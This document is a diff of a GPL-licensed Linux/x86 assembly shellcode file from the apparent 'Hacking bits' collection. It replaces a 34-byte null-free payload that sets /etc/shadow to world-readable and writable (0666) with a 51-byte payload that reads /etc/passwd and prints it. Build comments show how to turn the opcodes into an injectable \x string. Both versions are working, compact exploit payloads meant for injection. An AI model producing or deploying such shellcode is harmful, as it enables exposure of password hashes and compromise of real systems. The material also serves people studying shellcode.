@@ -1,4 +1,5 @@
-; Tiny chmod - Assembly Language - Linux/x86
+
+; Tiny Read File - Assembly Language - Linux/x86
 ; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
 ;
 ;   http://hackingbits.com
@@ -18,33 +19,45 @@
 ; along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 
-;   tiny_chmod
+;   tiny_read_file
 ;
-;   * 34 bytes
+;   * 51 bytes
 ;   * null-free
-;   * set 0666 permission to /etc/shadow
+;   * read 4096 bytes from /etc/passwd file
 ;
-;   # nasm -f elf32 tiny_chmod.asm
-;   # ld -m elf_i386 tiny_chmod.o -o tiny_chmod
-;   # for i in $(objdump -d tiny_chmod |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
-
+;   # nasm -f elf32 tiny_read_file.asm
+;   # ld -m elf_i386 tiny_read_file.o -o tiny_read_file
+;   # for i in $(objdump -d tiny_read_file |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
 
 global _start
 
 section .text
 
 _start:
+
 	xor ecx, ecx
-	mul ecx	
-	mov al, 15
-	push edx
-	push 0x776f6461
-	push 0x68732f2f
-	push 0x6374652f
+	mul ecx
+	mov al, 5
+	push ecx
+	push 0x64777373
+	push 0x61702f63
+	push 0x74652f2f
 	mov ebx, esp
-	mov cx, 0x1b6
 	int 0x80
 
+	xchg eax, ebx
+	xchg ecx, eax
+	mov al, 3
+	xor edx, edx
+	mov dx, 4095
 	inc edx
-	xchg eax, edx
+	int 0x80
+
+	xchg edx, eax
+	xor eax, eax
+	mov al, 4
+	mov bl, 1
+	int 0x80
+  
+	xchg eax, ebx
 	int 0x80
